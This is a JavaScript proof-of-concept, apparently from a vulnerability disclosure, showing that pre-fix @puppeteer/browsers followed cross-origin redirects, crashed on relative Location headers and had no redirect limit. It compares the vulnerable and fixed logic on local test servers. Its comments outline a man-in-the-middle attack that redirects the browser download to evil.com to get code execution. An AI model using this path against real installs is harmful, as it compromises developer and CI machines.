/**
 * PoC 3 — Cross-Origin Redirect Bypass in @puppeteer/browsers httpRequest()
 *
 * Vulnerability: packages/browsers/src/httpUtil.ts  httpRequest()
 * Lines 49-63 (pre-fix):
 *   httpRequest(new URL(res.headers.location), method, response);
 *
 * Root cause:
 *   When the download server returns an HTTP 3xx redirect, the client
 *   unconditionally follows the Location header to any host — including a
 *   completely different origin — without validation.  Additionally:
 *   (a) Relative Location values passed to `new URL(relative)` (no base) throw
 *       an unhandled TypeError, crashing the in-flight download.
 *   (b) There is no redirect-count limit, enabling infinite redirect loops.
 *
 * Attack scenario (MITM on browser binary download):
 *   1. Attacker intercepts the HTTP download from storage.googleapis.com
 *      (DNS poisoning, ARP spoofing, corporate proxy, etc.)
 *   2. Attacker's server responds: HTTP 302  Location: http://evil.com/chrome.zip
 *   3. Pre-fix Puppeteer follows the redirect to evil.com without any check.
 *   4. The downloaded binary is extracted and used as the browser executable
 *      → arbitrary code execution on the developer / CI machine.
 *
 * Impact: RCE on any machine running `puppeteer install` or
 *   `@puppeteer/browsers install` when network path is interceptable.
 *
 * Fixed in:  commit 174ad20
 *   – resolves relative URLs with base
 *   – blocks cross-hostname redirects
 *   – enforces maxRedirects = 10
 *
 * Google VRP scope: puppeteer/puppeteer
 */

import http from 'node:http';

// ── Reproduce VULNERABLE logic (pre-fix) ──────────────────────────────────────
function vulnerableHttpRequest(url, method, callback) {
  const req = http.request(
    {hostname: url.hostname, port: url.port || 80, path: url.pathname + url.search, method},
    res => {
      if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
        // BUG: no hostname check, no redirect limit
        // BUG: new URL(relative) throws TypeError — crashes the process
        let redirectUrl;
        try {
          redirectUrl = new URL(res.headers.location); // throws on relative URLs
        } catch (e) {
          callback(e); res.resume(); return;
        }
        vulnerableHttpRequest(redirectUrl, method, callback);
        res.resume();
      } else {
        callback(null, res);
      }
    },
  );
  req.on('error', e => callback(e));
  req.end();
}

// ── Reproduce SAFE logic (post-fix) ───────────────────────────────────────────
function safeHttpRequest(url, method, callback, maxRedirects = 10) {
  const req = http.request(
    {hostname: url.hostname, port: url.port || 80, path: url.pathname + url.search, method},
    res => {
      if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
        if (maxRedirects === 0) {
          callback(new Error('Too many redirects'));
          res.resume();
          return;
        }
        let redirectUrl;
        try {
          redirectUrl = new URL(res.headers.location, url); // handles relative URLs
        } catch {
          callback(new Error('Invalid redirect URL'));
          res.resume();
          return;
        }
        if (redirectUrl.hostname !== url.hostname) {
          callback(new Error(`Cross-origin redirect blocked: ${url.hostname} → ${redirectUrl.hostname}`));
          res.resume();
          return;
        }
        safeHttpRequest(redirectUrl, method, callback, maxRedirects - 1);
        res.resume();
      } else {
        callback(null, res);
      }
    },
  );
  req.on('error', e => callback(e));
  req.end();
}

function readBody(res) {
  return new Promise((resolve, reject) => {
    let data = '';
    res.on('data', c => (data += c));
    res.on('end', () => resolve({status: res.statusCode, body: data}));
    res.on('error', reject);
  });
}

// ── Two servers: origin (localhost) and attacker (127.0.0.1) ────────────────
// Both bind to the same loopback IP but differ in URL.hostname — exactly how
// the hostname comparison works in the fix.  Real attacks use different FQDNs.
let attackerPort;

const attackerServer = http.createServer((req, res) => {
  res.writeHead(200, {'Content-Type': 'application/zip'});
  res.end('[MALICIOUS BINARY — attacker-controlled content]');
});
await new Promise(r => attackerServer.listen(0, '127.0.0.1', r));
attackerPort = attackerServer.address().port;

// Origin server: redirects to "127.0.0.1" (the attacker's hostname)
const originServer = http.createServer((req, res) => {
  if (req.url === '/cross-origin') {
    // Cross-origin redirect — what the MITM sends
    res.writeHead(302, {Location: `http://127.0.0.1:${attackerPort}/evil-chrome.zip`});
    res.end();
  } else if (req.url === '/relative') {
    // Relative redirect — crashes pre-fix new URL(relative)
    res.writeHead(302, {Location: `/other-path`});
    res.end();
  } else if (req.url === '/loop') {
    // Infinite redirect loop
    res.writeHead(302, {Location: `http://localhost:${originPort}/loop`});
    res.end();
  } else {
    res.writeHead(200);
    res.end('[LEGITIMATE CHROME BINARY]');
  }
});
// Bind origin server so its URL hostname is "localhost"
await new Promise(r => originServer.listen(0, 'localhost', r));
const originPort = originServer.address().port;
const originUrl  = new URL(`http://localhost:${originPort}/chrome-linux.zip`);

console.log('='.repeat(62));
console.log('PoC 3 — Cross-Origin Redirect Bypass in httpUtil.httpRequest()');
console.log('='.repeat(62));
console.log(`Origin   (localhost  :${originPort}) → simulates storage.googleapis.com`);
console.log(`Attacker (127.0.0.1 :${attackerPort}) → simulates attacker-controlled host`);
console.log('');

// ── Test 1: Cross-origin redirect (the main vulnerability) ───────────────────
const crossOriginUrl = new URL(`http://localhost:${originPort}/cross-origin`);
console.log(`[1/3] CROSS-ORIGIN REDIRECT  GET ${crossOriginUrl.pathname}`);

let res = await new Promise(resolve =>
  vulnerableHttpRequest(crossOriginUrl, 'GET', (err, r) => resolve({err, r}))
);
if (res.err) {
  console.log(`      VULNERABLE → Error: ${res.err.message}`);
} else {
  const {status, body} = await readBody(res.r);
  console.log(`      VULNERABLE → HTTP ${status}: ${body}`);
  if (body.includes('MALICIOUS')) {
    console.log('      ✗  EXPLOITED — attacker body delivered to Puppeteer downloader');
  }
}

res = await new Promise(resolve =>
  safeHttpRequest(crossOriginUrl, 'GET', (err, r) => resolve({err, r}))
);
if (res.err) {
  console.log(`      FIXED      → blocked: ${res.err.message}`);
  console.log('      ✓  PROTECTED');
} else {
  const {status, body} = await readBody(res.r);
  console.log(`      FIXED      → HTTP ${status}: ${body}`);
}

// ── Test 2: Relative Location header crashes pre-fix ─────────────────────────
console.log('');
const relUrl = new URL(`http://localhost:${originPort}/relative`);
console.log(`[2/3] RELATIVE LOCATION CRASH  GET ${relUrl.pathname}`);

res = await new Promise(resolve =>
  vulnerableHttpRequest(relUrl, 'GET', (err, r) => resolve({err, r}))
);
if (res.err) {
  console.log(`      VULNERABLE → unhandled crash: ${res.err.message}`);
  console.log('      ✗  DoS — download stream crashes on relative redirect');
} else {
  const {status} = await readBody(res.r);
  console.log(`      VULNERABLE → HTTP ${status} (no crash — unexpected)`);
}

res = await new Promise(resolve =>
  safeHttpRequest(relUrl, 'GET', (err, r) => resolve({err, r}))
);
if (res.err) {
  console.log(`      FIXED      → graceful error: ${res.err.message}`);
} else {
  const {status, body} = await readBody(res.r);
  console.log(`      FIXED      → HTTP ${status}: ${body.substring(0, 40)}`);
}

// ── Test 3: Infinite redirect loop ───────────────────────────────────────────
console.log('');
const loopUrl = new URL(`http://localhost:${originPort}/loop`);
console.log(`[3/3] INFINITE REDIRECT LOOP  GET ${loopUrl.pathname}`);
console.log('      (VULNERABLE would hang forever — testing SAFE version only)');
res = await new Promise(resolve =>
  safeHttpRequest(loopUrl, 'GET', (err, r) => resolve({err, r}))
);
if (res.err) {
  console.log(`      FIXED      → ${res.err.message}`);
  console.log('      ✓  PROTECTED — loop terminated after maxRedirects');
}

console.log('');
originServer.close();
attackerServer.close();
